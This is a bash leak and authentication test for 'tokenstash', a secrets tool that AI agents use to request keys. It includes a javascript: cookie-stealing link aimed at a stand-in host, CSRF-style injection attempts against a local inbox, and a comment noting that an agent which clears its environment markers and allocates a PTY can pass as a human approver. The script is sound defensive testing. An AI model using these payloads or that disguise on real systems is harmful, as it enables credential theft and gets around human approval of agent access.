#!/usr/bin/env bash
# Black-box leak test: drive the real binary with a canary secret and assert the canary never
# appears on stdout/stderr, in the database, the config, the audit log, or MCP output.
set -euo pipefail
TS="$(cd "$(dirname "${1:-target/debug/tokenstash}")" 2>/dev/null && pwd)/$(basename "${1:-target/debug/tokenstash}")"
# `cargo test` does not build the CLI binary, so a default path can be missing or STALE (a
# debug binary from an older commit passed for a "flake" once). Refuse rather than test the
# wrong thing; the gate passes the freshly built release binary explicitly.
[ -x "$TS" ] || { echo "leak test: no binary at $TS — build it, or pass the path as \$1"; exit 2; }
command -v script >/dev/null || { echo "leak test: needs script(1) from util-linux"; exit 2; }
# A person at a terminal. The inventory commands show an agent only its own directory (list,
# audit), file a card for it (forget), or refuse it (tasks --all, open), so the steps of this
# script that read the stash as its owner run them under a pseudo-terminal with every marker
# cleared. `script` merges stderr into stdout and
# ends lines with CRLF; the CR is stripped here. The refusal itself is asserted separately below
# and in crates/cli/tests/human_only.rs.
HUMAN_ENV=(env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CODEX_SANDBOX -u CODEX_CI -u OPENAI_CODEX -u CURSOR_TRACE_ID -u CURSOR_AGENT -u GEMINI_CLI -u OPENCODE -u TOKENSTASH_AGENT)
# The insecure-file warning goes to stderr, which `script` folds into stdout; drop it so a
# JSON reader sees JSON. `sed` (not `grep -v`) so an empty result is not a failure.
human() { "${HUMAN_ENV[@]}" script -qec "$(printf '%q ' "$@")" /dev/null | tr -d '\r' | sed '/^tokenstash: WARNING — using insecure-file/d'; }
export TOKENSTASH_HOME="$(mktemp -d)"
export TOKENSTASH_STASH=insecure-file
PROJ="$(mktemp -d)"; cd "$PROJ"; git init -q .
OUT="$(mktemp -d)"
# Browser-facing responses legitimately contain the inbox session (the hidden CSRF field),
# so every curl body lands in $WEB. $OUT is the agent/CLI-facing surface, and the session
# must never appear there — see assertion (d).
WEB="$(mktemp -d)"
JAR="$(mktemp)"
CANARY="sk-LEAKCANARY-$(date +%s)-0123456789abcdef"

# A temp TOKENSTASH_HOME isolates the config and the database but NOT the OS credential
# store: the Linux kernel keyring is per-USER, so a canary stashed there outlives the run
# and turns up in the developer's next real session. Two defences, in this order:
#   1. pin the insecure-file backend (environment above, config below) and refuse to store
#      anything until the binary itself confirms that is the backend in use;
#   2. forget everything this run stashed, and delete the dirs holding the canary, on exit.
cleanup() {
  [ -n "${UNTRUSTED:-}" ] && rm -rf "$(dirname "$UNTRUSTED")"
    kill "${INBOX_PID:-}" "${SQUAT_PID:-}" 2>/dev/null || true
    cd / || true
    # every secret the isolated stash knows about is a canary this run created
    human "$TS" list 2>/dev/null | awk '$1 != "NAME" && $1 ~ /^[A-Z][A-Z0-9_]*$/ { print $1, $2 }' \
        | while read -r n i; do human "$TS" forget "$n" --identity "$i" >/dev/null 2>&1 || true; done
    # $WEB and $JAR hold authenticated pages and the session cookie, so they always go
    rm -rf "$TOKENSTASH_HOME" "$PROJ" "$WEB" "$JAR" || true
    # keep $OUT for debugging unless it turns out to hold the canary itself
    if grep -rq "$CANARY" "$OUT" 2>/dev/null; then rm -rf "$OUT" || true; fi
    return 0
}
trap cleanup EXIT

"$TS" init --no-agents >"$OUT/init.txt" 2>&1 || true
# Own the inbox for this run: a dedicated port, started by us, killed by PID. Never touch
# whatever real inbox the developer may have running.
PORT=$(( 20000 + RANDOM % 20000 ))
sed -i.bak -e "s/^inbox_port = .*/inbox_port = $PORT/" -e "s/^notifications = .*/notifications = false/" "$TOKENSTASH_HOME/config.toml"
if grep -q '^stash_backend' "$TOKENSTASH_HOME/config.toml"; then
    sed -i.bak 's/^stash_backend = .*/stash_backend = "insecure-file"/' "$TOKENSTASH_HOME/config.toml"
else
    printf 'stash_backend = "insecure-file"\n' >> "$TOKENSTASH_HOME/config.toml"
fi
# The canary is a fake OpenAI key: verify-on-use would send it to api.openai.com and mark
# it stale. Off for this run; the probe itself is covered by the loopback unit tests.
sed -i.bak -e 's/^verify_every = .*/verify_every = "never"/' "$TOKENSTASH_HOME/config.toml"
grep -q '^verify_every = "never"' "$TOKENSTASH_HOME/config.toml" || {
    echo "refusing to run: could not turn verify-on-use off; the canary would be sent to a real provider"
    exit 1
}
"$TS" doctor >"$OUT/doctor-pre.txt" 2>&1 || true
grep -qE "stash backend +insecure-file" "$OUT/doctor-pre.txt" || {
    echo "refusing to run: the stash backend is not isolated, a canary would land in the real keyring"
    sed -n 's/^.*stash backend/stash backend/p' "$OUT/doctor-pre.txt"; exit 1
}
"$TS" inbox --port "$PORT" --keep >"$OUT/inbox.txt" 2>&1 &
INBOX_PID=$!
# /verify is the unauthenticated ownership challenge, so it is also the readiness probe.
for _ in $(seq 1 30); do curl -fs "http://127.0.0.1:$PORT/verify?c=ready" >/dev/null 2>&1 && break; sleep 0.1; done
"$TS" need OPENAI_API_KEY AUTH_SECRET --agent ci --why "leak test" >"$OUT/need1.txt" 2>&1 || true
TID=$("$TS" tasks --json | python3 -c "import json,sys;print([t for t in json.load(sys.stdin) if t.get('name')=='OPENAI_API_KEY'][0]['id'])")
echo "$CANARY" | "$TS" answer "$TID" --stdin --skip-check >"$OUT/answer.txt" 2>&1
"$TS" need OPENAI_API_KEY --agent ci --json >"$OUT/need2.txt" 2>&1
human "$TS" list >"$OUT/list.txt" 2>&1
human "$TS" tasks --all --history --json >"$OUT/tasks.txt" 2>&1
human "$TS" audit >"$OUT/audit.txt" 2>&1
printf '%s\n' \
  '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","clientInfo":{"name":"ci"}}}' \
  '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"secrets_request","arguments":{"secrets":[{"name":"OPENAI_API_KEY"}],"project":"'"$PROJ"'"}}}' \
  '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"secrets_list","arguments":{}}}' \
  '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"task_list","arguments":{"all":true}}}' \
  | (cd "$PROJ" && "$TS" mcp) >"$OUT/mcp.txt" 2>&1
"$TS" doctor >"$OUT/doctor.txt" 2>&1 || true

# run shim: a child that echoes its environment must not leak the injected value
cat > "$PROJ/echo.sh" <<'SH'
#!/bin/sh
echo "env dump: OPENAI_API_KEY=$OPENAI_API_KEY"
echo "stderr: $OPENAI_API_KEY" >&2
exit 0
SH
chmod +x "$PROJ/echo.sh"
"$TS" run -- "$PROJ/echo.sh" >"$OUT/run.txt" 2>&1 || true
grep -q "\[redacted\]" "$OUT/run.txt" || { echo "run shim did not redact"; exit 1; }
# ...and an inherited parent-environment secret under a secret-looking name is redacted too
INHERITED="inherited-LEAKCANARY-$(date +%s)-zzzz"
cat > "$PROJ/echo2.sh" <<'SH'
#!/bin/sh
echo "MY_SERVICE_TOKEN is $MY_SERVICE_TOKEN"
SH
chmod +x "$PROJ/echo2.sh"
MY_SERVICE_TOKEN="$INHERITED" "$TS" run -- "$PROJ/echo2.sh" >"$OUT/run2.txt" 2>&1 || true
# ...including under a name with no secret-looking substring
cat > "$PROJ/echo3.sh" <<'SH'
#!/bin/sh
echo "cookie=$SESSION_COOKIE path=$PATH"
SH
chmod +x "$PROJ/echo3.sh"
# an EXISTING directory that is a prefix of PATH (a nonexistent one is rightly redacted)
PREFIX_DIR=""; IFS=: ; for d in $PATH; do [ -d "$d" ] && { PREFIX_DIR="$d"; break; }; done; unset IFS
# and the echoed PATH must begin with that existing entry for the assertion to be meaningful
export PATH="$PREFIX_DIR:$PATH"
SESSION_COOKIE="$INHERITED-cookie" MY_TOOL_HOME="$PREFIX_DIR" "$TS" run -- "$PROJ/echo3.sh" >"$OUT/run4.txt" 2>&1 || true
grep -q "$INHERITED-cookie" "$OUT/run4.txt" && { echo "LEAK: inherited SESSION_COOKIE echoed by child"; exit 1; }
grep -q "path=/" "$OUT/run4.txt" || { echo "benign PATH must not be redacted"; exit 1; }
# ...and a secret that merely starts with "/" (no such path) is still redacted
cat > "$PROJ/echo4.sh" <<'SH'
#!/bin/sh
echo "weird=$WEIRD_SECRET"
SH
chmod +x "$PROJ/echo4.sh"
WEIRD_SECRET="/slash-secret-LEAKCANARY-$(date +%s)/x" "$TS" run -- "$PROJ/echo4.sh" >"$OUT/run5.txt" 2>&1 || true
grep -q "slash-secret-LEAKCANARY" "$OUT/run5.txt" && { echo "LEAK: path-like secret echoed by child"; exit 1; }
# ...and even an existing-path secret under a non-allowlisted name is redacted
PATHSECRET="$OUT/tasks2.txt"
cat > "$PROJ/echo5.sh" <<'SH'
#!/bin/sh
echo "dir=$MY_DATA_DIR"
SH
chmod +x "$PROJ/echo5.sh"
MY_DATA_DIR="$PATHSECRET" "$TS" run -- "$PROJ/echo5.sh" >"$OUT/run6.txt" 2>&1 || true
grep -q "dir=$PATHSECRET" "$OUT/run6.txt" && { echo "LEAK: existing-path secret echoed by child"; exit 1; }
grep -q "$INHERITED" "$OUT/run2.txt" && { echo "LEAK: inherited env value echoed by child"; exit 1; }
grep -q "\[redacted\]" "$OUT/run2.txt" || { echo "run shim did not redact inherited value"; exit 1; }

# a secret passed as a command-line argument to `run` must not be persisted in the task text
cat > "$PROJ/fail.sh" <<'SH'
#!/bin/sh
echo "Error: GROQ_API_KEY is not set" >&2; exit 1
SH
chmod +x "$PROJ/fail.sh"
ARGSECRET="argsecret-LEAKCANARY-$(date +%s)"
"$TS" run --timeout 1 -- "$PROJ/fail.sh" --token "$ARGSECRET" >"$OUT/run3.txt" 2>&1 || true
human "$TS" tasks --all --history --json >"$OUT/tasks2.txt" 2>&1
grep -q "$ARGSECRET" "$OUT/tasks2.txt" && { echo "LEAK: command argument persisted in task"; exit 1; }

# a registry-named inherited value is redacted even when short (whole-token)
cat > "$PROJ/echo6.sh" <<'SH'
#!/bin/sh
echo "hf token: $HF_TOKEN ok"
SH
chmod +x "$PROJ/echo6.sh"
HF_TOKEN=abc "$TS" run -- "$PROJ/echo6.sh" >"$OUT/run7.txt" 2>&1 || true   # HF_TOKEN=abc
grep -q "hf token: abc ok" "$OUT/run7.txt" && { echo "LEAK: short registry-named value echoed"; exit 1; }

# the env file is the ONE place the value is allowed to be
grep -q "OPENAI_API_KEY=$CANARY" "$PROJ/.env.local"
grep -q "^.env.local$" "$PROJ/.gitignore"

# ── inbox authentication ──────────────────────────────────────────────────────
# Three credentials, three files: the browser session (rotated by every inbox start), the
# ownership-proof key (answers /verify, never in a URL) and the card capability key (signs
# one link per card, never in a URL). All 0600. The legacy inbox.token / inbox.paste.token
# are not created and, when present, authenticate nothing (checked below).
TOKEN_FILE="$TOKENSTASH_HOME/inbox.session"
PROOF_FILE="$TOKENSTASH_HOME/inbox.proof.key"
CAP_FILE="$TOKENSTASH_HOME/inbox.cap.key"
for f in "$TOKEN_FILE" "$PROOF_FILE" "$CAP_FILE"; do
  [ -s "$f" ] || { echo "FAIL: no credential at $f — the inbox is unauthenticated"; exit 1; }
  MODE="$(stat -c '%a' "$f" 2>/dev/null || stat -f '%Lp' "$f")"
  [ "$MODE" = 600 ] || { echo "FAIL: $f is $MODE, expected 600"; exit 1; }
done
[ -e "$TOKENSTASH_HOME/inbox.token" ] && { echo "FAIL: a legacy inbox.token was written"; exit 1; }
[ -e "$TOKENSTASH_HOME/inbox.paste.token" ] && { echo "FAIL: a legacy inbox.paste.token was written"; exit 1; }
TOKEN="$(cat "$TOKEN_FILE")"
PROOF="$(cat "$PROOF_FILE")"
CAPKEY="$(cat "$CAP_FILE")"
[ "$TOKEN" != "$PROOF" ] && [ "$TOKEN" != "$CAPKEY" ] && [ "$PROOF" != "$CAPKEY" ] || { echo "FAIL: two inbox credentials are identical"; exit 1; }
# Legacy credential files, as an upgrade would leave them: they must open nothing.
LEGACY_FULL="$(printf '1%.0s' $(seq 1 64))"; LEGACY_PASTE="$(printf '2%.0s' $(seq 1 64))"
printf '%s' "$LEGACY_FULL" >"$TOKENSTASH_HOME/inbox.token"; printf '%s' "$LEGACY_PASTE" >"$TOKENSTASH_HOME/inbox.paste.token"

# (a) the live exploit: an unauthenticated POST from any local process — or a loopback
# CSRF from any page the user visits — must not be able to store a value.
"$TS" need EVIL_TARGET_KEY --agent ci --why "inbox auth test" >"$OUT/need-evil.txt" 2>&1 || true
ETID=$("$TS" tasks --json | python3 -c "import json,sys;print([t for t in json.load(sys.stdin) if t.get('name')=='EVIL_TARGET_KEY'][0]['id'])")
code=$(curl -s -o "$WEB/exploit.txt" -w '%{http_code}' -X POST --data 'value=sk-EVIL-INJECTED&skip_check=1' "http://127.0.0.1:$PORT/t/$ETID")
[ "$code" = 404 ] || { echo "FAIL: unauthenticated POST /t/<id> returned $code, expected 404"; exit 1; }
[ -s "$WEB/exploit.txt" ] && { echo "FAIL: the 404 body is not empty — it reveals the inbox"; exit 1; }
grep -q "sk-EVIL-INJECTED" "$PROJ/.env.local" && { echo "FAIL: an unauthenticated POST stored a value"; exit 1; }
code=$(curl -s -o "$WEB/unauth-index.html" -w '%{http_code}' "http://127.0.0.1:$PORT/")
[ "$code" = 404 ] || { echo "FAIL: unauthenticated GET / returned $code, expected 404"; exit 1; }
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST --data "action=allow" "http://127.0.0.1:$PORT/t/$ETID?t=$TOKEN")
[ "$code" = 404 ] || { echo "FAIL: POST with a query token but no cookie/CSRF field returned $code, expected 404"; exit 1; }
grep -q "sk-EVIL-INJECTED" "$PROJ/.env.local" && { echo "FAIL: a POST without the CSRF field stored a value"; exit 1; }

# (c) /verify is a challenge-response ownership proof, not a credential check: it is how the CLI
# learns the listener on the port is OUR inbox for THIS TOKENSTASH_HOME without sending the
# key to a process it has not authenticated yet. The answer is HMAC(proof key, tag || nonce);
# the proof key is never in a URL, so nothing captured from a link can produce it.
NONCE="nonce-$(date +%s)-$RANDOM"
hmacof() { python3 -c "import hmac,hashlib,sys;print(hmac.new(sys.argv[1].encode(),sys.argv[2].encode(),hashlib.sha256).hexdigest())" "$1" "$2"; }
VTAG="tokenstash-inbox-verify-v1:"
EXPECT="$(hmacof "$PROOF" "$VTAG$NONCE")"
GOT="$(curl -fsS "http://127.0.0.1:$PORT/verify?c=$NONCE")"
[ "$GOT" = "$EXPECT" ] || { echo "FAIL: /verify answered '$GOT', expected HMAC-SHA256(proof, tag||nonce) = '$EXPECT'"; exit 1; }
[ "$GOT" != "$PROOF" ] && [ "$GOT" != "$TOKEN" ] || { echo "FAIL: /verify echoed a credential itself"; exit 1; }
# an impostor holding a different key cannot produce that answer — that is the proof
[ "$GOT" != "$(hmacof "$(printf '0%.0s' $(seq 1 64))" "$VTAG$NONCE")" ] || { echo "FAIL: /verify is not bound to the proof key"; exit 1; }
# ...nor can whoever captured the browser session, the card key, or a legacy token from a URL
for k in "$TOKEN" "$CAPKEY" "$LEGACY_FULL" "$LEGACY_PASTE"; do
  [ "$GOT" != "$(hmacof "$k" "$VTAG$NONCE")" ] || { echo "FAIL: a credential that travels in URLs can forge /verify"; exit 1; }
done
[ "$GOT" != "$(hmacof "$PROOF" "$NONCE")" ] || { echo "FAIL: /verify is not domain-separated"; exit 1; }
# a replayed answer proves nothing about a later challenge
[ "$GOT" != "$(curl -fsS "http://127.0.0.1:$PORT/verify?c=${NONCE}x")" ] || { echo "FAIL: /verify is not bound to the challenge"; exit 1; }
# ...and /verify without a challenge is a bare 404 like every other unauthorised shape
code=$(curl -s -o "$WEB/verify-noc.txt" -w '%{http_code}' "http://127.0.0.1:$PORT/verify")
[ "$code" = 404 ] || { echo "FAIL: /verify with no challenge returned $code, expected 404"; exit 1; }
[ -s "$WEB/verify-noc.txt" ] && { echo "FAIL: the /verify 404 body is not empty"; exit 1; }
# the CLI uses the same proof before trusting the port (doctor ran while this inbox was up)
grep -q "ownership verified" "$OUT/doctor.txt" || { echo "FAIL: doctor did not verify inbox ownership"; exit 1; }

# (b) the session flow still works end to end: ?t= authenticates the first GET, the response
# installs the session cookie, and a POST carrying cookie + hidden field answers the task.
curl -fsS -c "$JAR" -b "$JAR" -L -o "$WEB/task.html" "http://127.0.0.1:$PORT/t/$ETID?t=$TOKEN"
grep -q "tokenstash_inbox" "$JAR" || { echo "FAIL: the tokened GET did not set the session cookie"; exit 1; }
grep -q "name=t value=\"$TOKEN\"" "$WEB/task.html" || { echo "FAIL: the task form carries no CSRF field"; exit 1; }
grep -q "EVIL_TARGET_KEY" "$WEB/task.html" || { echo "FAIL: the authenticated task page did not render"; exit 1; }
# the persistent keys and the legacy tokens are not browser credentials
for k in "$PROOF" "$CAPKEY" "$LEGACY_FULL" "$LEGACY_PASTE"; do
  code=$(curl -s -o "$WEB/notcred.html" -w '%{http_code}' -c "$WEB/notcred.jar" "http://127.0.0.1:$PORT/t/$ETID?t=$k")
  [ "$code" = 404 ] || { echo "FAIL: a non-session credential opened a full route ($code)"; exit 1; }
  grep -q "no longer valid" "$WEB/notcred.html" || { echo "FAIL: a refused ?t= did not get the recovery page"; exit 1; }
  grep -q "tokenstash_" "$WEB/notcred.jar" 2>/dev/null && { echo "FAIL: a refused ?t= set a cookie"; exit 1; }
  code=$(curl -s -o /dev/null -w '%{http_code}' -b "tokenstash_inbox=$k" "http://127.0.0.1:$PORT/")
  [ "$code" = 404 ] || { echo "FAIL: a non-session value in the cookie opened the index ($code)"; exit 1; }
done
rm -f "$TOKENSTASH_HOME/inbox.token" "$TOKENSTASH_HOME/inbox.paste.token"
# the cookie alone is not enough: without the hidden field this is still a CSRF-shaped post
code=$(curl -s -b "$JAR" -o /dev/null -w '%{http_code}' --data 'value=sk-EVIL2-INJECTED&skip_check=1' "http://127.0.0.1:$PORT/t/$ETID")
[ "$code" = 404 ] || { echo "FAIL: POST with the cookie but no CSRF field returned $code, expected 404"; exit 1; }
grep -q "sk-EVIL2-INJECTED" "$PROJ/.env.local" && { echo "FAIL: a POST without the CSRF field stored a value"; exit 1; }
# ...and a wrong hidden field is no better than a missing one
code=$(curl -s -b "$JAR" -o /dev/null -w '%{http_code}' --data "value=sk-EVIL3-INJECTED&skip_check=1&t=$(printf '0%.0s' $(seq 1 64))" "http://127.0.0.1:$PORT/t/$ETID")
[ "$code" = 404 ] || { echo "FAIL: POST with a wrong CSRF field returned $code, expected 404"; exit 1; }
# an answer we could not read to the end is refused outright, not truncated and stored: the
# CSRF field sits at the front of the body, so a cut-off form would still authenticate and the
# prefix of a pasted key would be persisted as though the human had typed it.
"$TS" need BIG_TARGET_KEY --agent ci --why "oversize test" >"$OUT/need-big.txt" 2>&1 || true
BTID=$("$TS" tasks --json | python3 -c "import json,sys;print([t for t in json.load(sys.stdin) if t.get('name')=='BIG_TARGET_KEY'][0]['id'])")
BIG="BIGCANARY-$(head -c 70000 /dev/zero | tr '\0' 'A')"
code=$(curl -s -b "$JAR" -o "$WEB/big.txt" -w '%{http_code}' \
  --data "t=$TOKEN" --data "skip_check=1" --data-urlencode "value=$BIG" "http://127.0.0.1:$PORT/t/$BTID")
[ "$code" = 413 ] || { echo "FAIL: an oversized answer returned $code, expected 413"; exit 1; }
grep -q "BIGCANARY" "$PROJ/.env.local" && { echo "FAIL: a truncated oversized answer was stored"; exit 1; }
"$TS" tasks --json | python3 -c "import json,sys;sys.exit(0 if [t for t in json.load(sys.stdin) if t.get('name')=='BIG_TARGET_KEY' and t['status']=='pending'] else 1)" \
  || { echo "FAIL: the oversized answer changed the task state"; exit 1; }

# every page carries the headers that keep it inert and un-embeddable
head=$(curl -s -D - -o /dev/null -b "$JAR" "http://127.0.0.1:$PORT/t/$ETID")
printf '%s' "$head" | grep -qi "content-security-policy: default-src 'none'" || { echo "FAIL: no restrictive CSP on an inbox page"; exit 1; }
printf '%s' "$head" | grep -qi "x-frame-options: DENY" || { echo "FAIL: the inbox page can be framed"; exit 1; }
printf '%s' "$head" | grep -qi "referrer-policy: no-referrer" || { echo "FAIL: the inbox page leaks a referrer"; exit 1; }

# a link an agent chose is never rendered as anything but http(s): the inbox origin holds the
# session that approves grants, so a javascript: href there is a full compromise of it
"$TS" need JS_LINK_KEY --agent ci --why "link test" --url "javascript:fetch('//evil/'+document.cookie)" >"$OUT/need-jslink.txt" 2>&1 || true
JTID=$("$TS" tasks --json | python3 -c "import json,sys;print([t for t in json.load(sys.stdin) if t.get('name')=='JS_LINK_KEY'][0]['id'])")
curl -fsS -b "$JAR" -o "$WEB/jslink.html" "http://127.0.0.1:$PORT/t/$JTID"
grep -qi "javascript:" "$WEB/jslink.html" && { echo "FAIL: an agent-supplied javascript: link reached the page"; exit 1; }

# the real thing
GOOD="sk-GOODCANARY-$(date +%s)-0123456789abcdef"
curl -fsS -c "$JAR" -b "$JAR" -L -o "$WEB/answered.html" \
  --data-urlencode "value=$GOOD" --data "skip_check=1" --data-urlencode "t=$TOKEN" "http://127.0.0.1:$PORT/t/$ETID"
grep -q "EVIL_TARGET_KEY=$GOOD" "$PROJ/.env.local" || { echo "FAIL: the authenticated answer did not store the value"; exit 1; }
# ── the card link: what the agent hands the human ───────────────────────────────
# It must (1) open and answer ITS missing-key card straight from the chat, (2) never carry or
# reveal the session or a key, (3) open no other card, on no route, (4) be unable to approve,
# and (5) never replace a full session. It lives on the scoped route /p/<id>; the session
# lives on / and /t/<id>; neither cookie is read on the other's routes.
PJAR="$WEB/paste.jar"; : >"$PJAR"
"$TS" need PASTE_TARGET_KEY --agent ci --why "card link test" >"$OUT/need-paste.txt" 2>&1 || true
PTID=$("$TS" tasks --json | python3 -c "import json,sys;print([t for t in json.load(sys.stdin) if t.get('name')=='PASTE_TARGET_KEY'][0]['id'])")
PLINK=$(grep -o "http://127.0.0.1:$PORT/p/$PTID?t=[A-Za-z0-9_.]*" "$OUT/need-paste.txt" | head -1)
[ -n "$PLINK" ] || { echo "FAIL: the agent-facing need output does not carry the card link"; cat "$OUT/need-paste.txt"; exit 1; }
PCAP="${PLINK#*?t=}"
case "$PCAP" in "$PTID".*) ;; *) echo "FAIL: the card credential does not name its card: $PCAP"; exit 1;; esac
PMAC="${PCAP#*.}"
for k in "$TOKEN" "$PROOF" "$CAPKEY"; do grep -q "$k" "$OUT/need-paste.txt" && { echo "LEAK: need output carries a key or the session"; exit 1; }; done
curl -fsS -c "$PJAR" -b "$PJAR" -L -o "$WEB/paste-task.html" "$PLINK"
grep -q "tokenstash_card" "$PJAR" || { echo "FAIL: the card link did not open a card session"; exit 1; }
grep -q "tokenstash_inbox" "$PJAR" && { echo "FAIL: the card link set the SESSION cookie"; exit 1; }
grep -q "/p/$PTID" "$PJAR" || { echo "FAIL: the card cookie is not confined to its card's path"; cat "$PJAR"; exit 1; }
grep -q "$TOKEN" "$WEB/paste-task.html" && { echo "LEAK: the card page contains the session"; exit 1; }
grep -q "name=t value=\"$PCAP\"" "$WEB/paste-task.html" || { echo "FAIL: the card form carries no CSRF field of its own"; exit 1; }
grep -q "$ETID\|$BTID" "$WEB/paste-task.html" && { echo "FAIL: the card page names another card"; exit 1; }
# no other card, on no route: the sibling's scoped route, the full routes, a prefix, a
# re-addressed or forged credential
for target in "/p/$BTID" "/t/$PTID" "/" "/p/${PTID%?}"; do
  code=$(curl -s -o "$WEB/foreign.txt" -w '%{http_code}' -b "$PJAR" "http://127.0.0.1:$PORT$target")
  [ "$code" = 404 ] && [ ! -s "$WEB/foreign.txt" ] || { echo "FAIL: a card cookie opened $target ($code)"; exit 1; }
done
for bad in "/p/$BTID?t=$BTID.$PMAC" "/p/$BTID?t=$PCAP" "/p/$PTID?t=${PTID%?}.$PMAC" "/p/$PTID?t=$PTID.$(printf '0%.0s' $(seq 1 64))" "/p/$PTID?t=$CAPKEY" "/t/$PTID?t=$PCAP" "/?t=$PCAP"; do
  code=$(curl -s -o "$WEB/forged.html" -w '%{http_code}' -c "$WEB/forged.jar" "http://127.0.0.1:$PORT$bad")
  [ "$code" = 404 ] || { echo "FAIL: $bad authenticated ($code)"; exit 1; }
  grep -q "tokenstash_" "$WEB/forged.jar" 2>/dev/null && { echo "FAIL: $bad set a cookie"; exit 1; }
done
# a POST from the card session against another card is refused with nothing changed
code=$(curl -s -b "$PJAR" -o /dev/null -w '%{http_code}' --data "action=deny&t=$PCAP" "http://127.0.0.1:$PORT/p/$BTID")
[ "$code" = 404 ] || { echo "FAIL: a card session denied another card ($code)"; exit 1; }
code=$(curl -s -b "$PJAR" -o /dev/null -w '%{http_code}' --data "value=sk-EVIL5-INJECTED&skip_check=1&t=$PCAP" "http://127.0.0.1:$PORT/p/$BTID")
[ "$code" = 404 ] || { echo "FAIL: a card session pasted into another card ($code)"; exit 1; }
grep -q "sk-EVIL5-INJECTED" "$PROJ/.env.local" && { echo "FAIL: a card session stored a value under another card"; exit 1; }
"$TS" tasks --json | python3 -c "import json,sys;sys.exit(0 if [t for t in json.load(sys.stdin) if t.get('name')=='BIG_TARGET_KEY' and t['status']=='pending'] else 1)" \
  || { echo "FAIL: a card session changed another card's state"; exit 1; }
PGOOD="sk-PASTECANARY-$(date +%s)-0123456789abcdef"
curl -fsS -c "$PJAR" -b "$PJAR" -L -o "$WEB/paste-answered.html" \
  --data-urlencode "value=$PGOOD" --data "skip_check=1" --data-urlencode "t=$PCAP" "http://127.0.0.1:$PORT/p/$PTID"
grep -q "PASTE_TARGET_KEY=$PGOOD" "$PROJ/.env.local" || { echo "FAIL: the card link could not answer its own missing-key card"; exit 1; }
grep -q "Stored PASTE_TARGET_KEY" "$WEB/paste-answered.html" || { echo "FAIL: the card session was not shown its result on its own route"; exit 1; }
# a card CSRF field does not authenticate a session cookie, and vice versa
code=$(curl -s -b "$JAR" -o /dev/null -w '%{http_code}' --data "value=sk-EVIL4&skip_check=1&t=$PCAP" "http://127.0.0.1:$PORT/t/$BTID")
[ "$code" = 404 ] || { echo "FAIL: a card CSRF field with a session cookie returned $code, expected 404"; exit 1; }
code=$(curl -s -b "$PJAR" -o /dev/null -w '%{http_code}' --data "value=sk-EVIL6&skip_check=1&t=$TOKEN" "http://127.0.0.1:$PORT/p/$PTID")
[ "$code" = 404 ] || { echo "FAIL: the session as CSRF field with a card cookie returned $code, expected 404"; exit 1; }
grep -q "sk-EVIL4\|sk-EVIL6" "$PROJ/.env.local" && { echo "FAIL: a mismatched CSRF field stored a value"; exit 1; }
# an approval card: a stash hit in a directory that was never paired (and an unregistered key)
# (a project dir that is NOT under $OUT: $OUT is the agent-facing surface and is grepped for
# values, and the env file written here legitimately holds one)
UNTRUSTED="$(mktemp -d)/untrusted"; mkdir -p "$UNTRUSTED"
(cd "$UNTRUSTED" && "$TS" need EVIL_TARGET_KEY --agent ci) >"$OUT/need-untrusted.txt" 2>&1 || true
ATID=$(human "$TS" tasks --all --json | python3 -c "import json,sys;l=[t for t in json.load(sys.stdin) if t.get('kind')=='approval' and t['status']=='pending'];print(l[0]['id'] if l else '')")
[ -n "$ATID" ] || { echo "FAIL: a stash hit in an unpaired directory did not create an approval card"; sed -n 1,5p "$OUT/need-untrusted.txt"; exit 1; }
# The CLI has the same guard the paste-scope link does: an agent with a shell can read this
# card's id out of `tasks --json`, so `answer --allow` must refuse it. (Not a boundary on its
# own — an agent that scrubs its env and allocates a PTY looks like a person — which is why
# the token scope above is the real control and this is the second lock on the same door.)
TOKENSTASH_AGENT=claude-code "$TS" answer "$ATID" --allow >"$OUT/self-approve.txt" 2>&1 \
  && { echo "FAIL: an agent approved its own card from the shell"; exit 1; }
grep -q "person at a terminal" "$OUT/self-approve.txt" || { echo "FAIL: the refusal does not explain itself"; cat "$OUT/self-approve.txt"; exit 1; }
TOKENSTASH_AGENT=claude-code "$TS" answer "$ATID" --allow-broad >>"$OUT/self-approve.txt" 2>&1 \
  && { echo "FAIL: an agent granted itself broadly from the shell"; exit 1; }
human "$TS" tasks --all --json | ATID="$ATID" python3 -c "import json,sys,os;sys.exit(0 if [t for t in json.load(sys.stdin) if t['id']==os.environ['ATID'] and t['status']=='pending'] else 1)" \
  || { echo "FAIL: the refused approval changed the card"; exit 1; }
grep -q "EVIL_TARGET_KEY=" "$UNTRUSTED/.env.local" 2>/dev/null && { echo "FAIL: a refused CLI approval injected a key"; exit 1; }

# The approval card's own link (what the agent in $UNTRUSTED printed) shows the card and can
# neither approve nor close it.
ALINK=$(grep -o "http://127.0.0.1:$PORT/p/$ATID?t=[A-Za-z0-9_.]*" "$OUT/need-untrusted.txt" | head -1)
[ -n "$ALINK" ] || { echo "FAIL: the agent output for the approval card carries no card link"; cat "$OUT/need-untrusted.txt"; exit 1; }
ACAP="${ALINK#*?t=}"; AJAR="$WEB/approval.jar"; : >"$AJAR"
curl -fsS -c "$AJAR" -b "$AJAR" -L -o "$WEB/paste-approval.html" "$ALINK"
grep -q "value=allow" "$WEB/paste-approval.html" && { echo "FAIL: the card session was offered an Allow button"; exit 1; }
grep -q "your own inbox link" "$WEB/paste-approval.html" || { echo "FAIL: the card approval page does not explain how to get the full session"; exit 1; }
grep -q "$TOKEN" "$WEB/paste-approval.html" && { echo "LEAK: the approval card page carries the session"; exit 1; }
curl -s -c "$AJAR" -b "$AJAR" -o "$WEB/paste-approve-try.html" --data "action=allow&t=$ACAP" "http://127.0.0.1:$PORT/p/$ATID"
human "$TS" tasks --all --json | ATID="$ATID" python3 -c "import json,sys,os;sys.exit(0 if [t for t in json.load(sys.stdin) if t['id']==os.environ['ATID'] and t['status']=='pending'] else 1)" \
  || { echo "FAIL: a card-session POST approved a trust gate"; exit 1; }
grep -q "EVIL_TARGET_KEY=" "$UNTRUSTED/.env.local" 2>/dev/null && { echo "FAIL: a card-session approval attempt injected a key"; exit 1; }
grep -q "your own inbox link" "$WEB/paste-approve-try.html" || { echo "FAIL: the card-session approval refusal does not explain"; exit 1; }
# ...nor close it: an approval card is the person's decision either way
